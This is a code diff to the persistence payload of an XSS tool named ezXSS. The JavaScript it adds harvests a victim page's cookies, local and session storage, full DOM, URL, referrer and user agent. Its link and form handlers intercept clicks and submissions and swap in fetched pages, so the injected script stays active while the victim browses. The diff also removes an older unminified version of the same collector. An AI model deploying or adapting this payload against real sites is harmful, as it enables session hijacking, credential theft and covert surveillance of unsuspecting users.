@@ -4,6 +4,17 @@ if(!console.ez){var ms=["log","error","warn"];console.ez="";function ez_for(t,a)
 function ra_client(){var e="ezXSS",r,t,a,n="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",o;try{r="localStorage"in window&&null!==window.localStorage}catch(e){r=!1}r?(t=localStorage.getItem(e),t||(t=function(){for(var e="",r=0;r<16;r++)e+=n.charAt(Math.floor(Math.random()*n.length));return e}(),localStorage.setItem("ezXSS",t))):(a=document.cookie.split(";").map(function(e){return e.trim()}).filter(function(r){return 0===r.indexOf(e)}),t=a.length>0?a[0].substring(e.length):null,t||(t=function(){for(var e="",r=0;r<16;r++)e+=n.charAt(Math.floor(Math.random()*n.length));return e}(),(o=new Date).setFullYear(o.getFullYear()+1),o=o.toUTCString().replace("GMT",""),document.cookie=e+"="+t+";expires="+o+";path=/;SameSite=lax;"));return t}
 function ez_stop(){ez_exi=true}
 
+function ra_hL(){if(!ez_exi){ez_rD.type="init",ez_rD.console=console.ez;try{ez_rD.clientid=ra_client()}catch(t){ez_rD.clientid=""}try{ez_rD.method="persist"}catch(e){ez_rD.method=""}try{ez_rD.uri=ez_n(location.toString())}catch(r){ez_rD.uri=""}try{ez_rD.cookies=ez_n(document.cookie)}catch(c){ez_rD.cookies=""}try{""!=ez_las?ez_rD.referer=ez_n(ez_las):ez_rD.referer=ez_n(document.referrer)}catch(o){ez_rD.referer=""}try{ez_rD["user-agent"]=ez_n(navigator.userAgent)}catch(i){ez_rD["user-agent"]=""}try{ez_rD.origin=ez_n(location.origin)}catch(a){ez_rD.origin=""}try{ez_rD.localstorage=ez_n(window.localStorage)}catch(s){ez_rD.localstorage=""}try{ez_rD.sessionstorage=ez_n(window.sessionStorage)}catch(n){ez_rD.sessionstorage=""}try{ez_rD.dom=ez_n(document.documentElement.outerHTML),h()}catch(g){ez_rD.dom="",h()}}function h(){ra_r()}}
+function ez_dol(t,e,r=""){if(ez_las=ez_n(location.toString()),""===r)var n=t.match(/<title[^>]*>([^<]+)<\/title>/),r=n?n[1]:"";document.title=r,window.history.pushState({html:t,pageTitle:r},"",e),document.getElementsByTagName("html")[0].innerHTML=t,window.scrollTo(0,0);var l=document.createElement("div");l.innerHTML=t;for(var a=l.getElementsByTagName("script"),i=0;i<a.length;i++){var o=document.createElement("script");a[i].src?o.src=a[i].src:o.textContent=a[i].textContent,document.body.appendChild(o),o.parentNode.removeChild(o)}}
+
+function ra_li(e){var r=document.createElement("a");if(r.href=e,r.hostname===window.location.hostname){if("#"===r.href.slice(-1)&&""===r.hash)return;if(""!==r.hash&&r.href.replace(r.hash,"")===window.location.href.split("#")[0]){var t=r.hash.replace("#",""),n=document.getElementById(t).offsetTop;window.history.pushState("",document.title,r.href),window.scrollTo(0,n);return}var o=new XMLHttpRequest;o.onload=function(){4==this.readyState&&(ez_dol(this.responseText,r.href),eze_ini())},o.onerror=function(){window.open(r.href,"_blank").focus()},o.open("GET",r.href),o.send()}else window.open(r.href,"_blank").focus()}
+
+function ez_hac(e){var t=(e=e||window.event).target||e.srcElement,r=function(){for(var e=t;e;){if(e.tagName&&"a"===e.tagName.toLowerCase())return e;e=e.parentNode}return null}();r&&!r.href.startsWith("javascript:")&&(e.preventDefault?e.preventDefault():e.returnValue=!1,ra_li(r.getAttribute("href")))}
+
+function ra_fo(t){(t=t||window.event).preventDefault?t.preventDefault():t.returnValue=!1;var e=document.createElement("a");if(e.href=this.action,e.hostname===window.location.hostname){var a=new XMLHttpRequest;a.open("POST",this.action,!0),a.onreadystatechange=function(){4==this.readyState&&(ez_dol(this.responseText,e.href),eze_ini())};var n=new FormData(this);this.dataset.clickedButtonName&&this.dataset.clickedButtonValue&&n.append(this.dataset.clickedButtonName,this.dataset.clickedButtonValue),a.send(n)}else{var s=window.open(this.action,"_blank");s&&s.focus&&(this.target="_blank",t.preventDefault&&t.preventDefault(),this.submit())}}
+
+function ez_hab(t){var e=t.target||t.srcElement,a=e.form;a.dataset.clickedButtonName=e.name,a.dataset.clickedButtonValue=e.value}function ez_hap(t){t.state&&t.state.html&&t.state.pageTitle&&(ez_dol(t.state.html,t.state.url,t.state.pageTitle),eze_ini())}
+
 function ez_fet(url, method = 'GET', postData = null) {
     return new Promise(function (resolve, reject) {
         var xhr = new XMLHttpRequest();
@@ -71,10 +82,7 @@ function ez_soc(h, p=0) {
         }
     };
 
-
-    ez_we.onerror = function (error) {
-        //
-    };
+    ez_we.onerror = function (error) {};
 
     ez_we.onclose = function () {
         setTimeout(function() {
@@ -83,168 +91,46 @@ function ez_soc(h, p=0) {
     };
 }
 
-function ra_hL() {
-    if(ez_exi){return}
-    ez_rD.type = 'init';
-    ez_rD.console = console.ez;
-    try {
-        ez_rD.clientid = ra_client()
-    } catch (e) {
-        ez_rD.clientid = ""
-    }
-    try {
-        ez_rD.method = "persist"
-    } catch (e) {
-        ez_rD.method = ""
-    }
-    try {
-        ez_rD.uri = ez_n(location.toString())
-    } catch (e) {
-        ez_rD.uri = ""
-    }
-    try {
-        ez_rD.cookies = ez_n(document.cookie)
-    } catch (e) {
-        ez_rD.cookies = ""
-    }
-    try {
-        if (ez_las != '') {
-            ez_rD.referer = ez_n(ez_las)
-        } else {
-            ez_rD.referer = ez_n(document.referrer)
-        }
-    } catch (e) {
-        ez_rD.referer = ""
-    }
-    try {
-        ez_rD["user-agent"] = ez_n(navigator.userAgent)
-    } catch (e) {
-        ez_rD["user-agent"] = ""
-    }
-    try {
-        ez_rD.origin = ez_n(location.origin)
-    } catch (e) {
-        ez_rD.origin = ""
-    }
-    try {
-        ez_rD.localstorage = ez_n(window.localStorage);
-    } catch (e) {
-        ez_rD.localstorage = "";
-    }
-    try {
-        ez_rD.sessionstorage = ez_n(window.sessionStorage);
-    } catch (e) {
-        ez_rD.sessionstorage = "";
-    }
-    try {
-        ez_rD.dom = "";//ez_n(document.documentElement.outerHTML); //ez_n(document.documentElement.outerHTML)
-    } catch (e) {
-        ez_rD.dom = ""
-    }
-    try {
-        ez_rD.screenshot = "", ra_c()
-        //html2canvas(document.body).then(function (e) {
-        //    ez_rD.screenshot = ez_n(e.toDataURL()), ra_c();
-        //});
-    } catch (e) {
-        ez_rD.screenshot = "", ra_c()
-    }
-
-    function ra_c() {
-        ra_r()
-    }
-}
-
 function ra_r() {
     if(ez_exi){return}
-    document.querySelectorAll('a').forEach(link => {
-        link.addEventListener('click', (e) => {
-            e.preventDefault();
-            let paths = e.path;
-            var linkFound = false;
-            for (path in paths) {
-                for (subpath in path) {
-                    if (paths[path].nodeName === 'A') {
 
-                        console.log('A link with target URL ' + paths[path].href + ' was clicked');
+    var links = document.getElementsByTagName('a');
+  
+    for (var i = 0; i < links.length; i++) {
+      var link = links[i];
+  
+      if (link.addEventListener) {
+        link.addEventListener('click', ez_hac, false);
+      } else if (link.attachEvent) {
+        link.attachEvent('onclick', ez_hac);
+      }
+    }
 
-                        if (paths[path].hostname === window.location.hostname) {
-                            if (paths[path].href.slice(-1) === '#' && paths[path].hash === '') {
-                                break;
-                            }
+    var forms = document.getElementsByTagName('form');
+    for (var i = 0; i < forms.length; i++) {
+        var form = forms[i];
+        var submitButtons = form.querySelectorAll('button[type="submit"], input[type="submit"]');
 
-                            // Same page click
-                            if (paths[path].hash !== "" && paths[path].href.replace(paths[path].hash, '') === window.location.href.split('#')[0]) {
-                                var hash = paths[path].hash.replace('#', '');
-                                var top = document.getElementById(hash).offsetTop;
-                                window.history.pushState("", document.title, paths[path].href);
-                                window.scrollTo(0, top);
-                                linkFound = true;
-                                break;
-                            }
+        if (form.addEventListener) {
+        form.addEventListener('submit', ra_fo, false);
+        } else if (form.attachEvent) {
+        form.attachEvent('onsubmit', ra_fo);
+        }
 
-                            // Page click on same domain
-                            var request = new XMLHttpRequest();
-                            request.onload = function () {
-                                if (this.readyState == 4) {
-                                    ez_las = ez_n(location.toString());
-                                    document.getElementsByTagName("html")[0].innerHTML = this.responseText;
-                                    window.scrollTo(0, 0);
-                                    let title = this.responseText.match(/<title[^>]*>([^<]+)<\/title>/)[1];
-                                    document.title = title;
-                                    window.history.pushState({ "html": this.responseText, "pageTitle": title }, "", paths[path].href);
-
-                                    let scripts = Array.from(this.responseText.matchAll(/<script[^>]*src=[^>]*>[^>]*<\/script>/g));
-                                    for (script in scripts) {
-                                        try {
-                                            var search = /<script[^>]+src="([^">]+)"/g;
-                                            var src = search.exec(scripts[script][0])[1];
-                                            var a = document.createElement('script');
-                                            a.src = src;
-                                            document.body.appendChild(a);
-                                        } catch (e) { }
-                                    }
-                                    eze_ini();
-                                }
-                            };
-
-                            request.onerror = function () {
-                                window.open(paths[path].href, '_blank').focus();
-                            };
-
-                            request.open('GET', paths[path].href);
-                            request.send();
-                        } else {
-                            // Click to other domain
-                            window.open(paths[path].href, '_blank').focus();
-                        }
-                        linkFound = true;
-                        break;
-                    }
-                }
-                if (linkFound) break;
+        for (var j = 0; j < submitButtons.length; j++) {
+            var submitButton = submitButtons[j];
+            
+            if (submitButton.addEventListener) {
+              submitButton.addEventListener('click', ez_hab, false);
+            } else if (submitButton.attachEvent) {
+              submitButton.attachEvent('onclick', ez_hab);
             }
-        });
-    });
+          }
+    }
 
-    /**document.querySelectorAll("form").forEach(form => {
-        form.addEventListener("submit", event => {
-            event.preventDefault(); // prevent the form from redirecting or refreshing the page
-            const formData = new FormData(form); // get all data from the form
-            const xhr = new XMLHttpRequest();
-            xhr.open("POST", form.action);
-            xhr.onload = () => {
-                if (xhr.status === 200) {
-                    console.log('yes!');
-                    document.documentElement.innerHTML = xhr.response;
-
-
-                    console.log('done!');
-                } else {
-                    alert("An error occurred while processing the form.");
-                }
-            };
-            xhr.send(formData);
-        });
-    });**/
+    if (window.addEventListener) {
+        window.addEventListener('popstate', ez_hap, false);
+      } else if (window.attachEvent) {
+        window.attachEvent('onpopstate', ez_hap);
+      }
 }
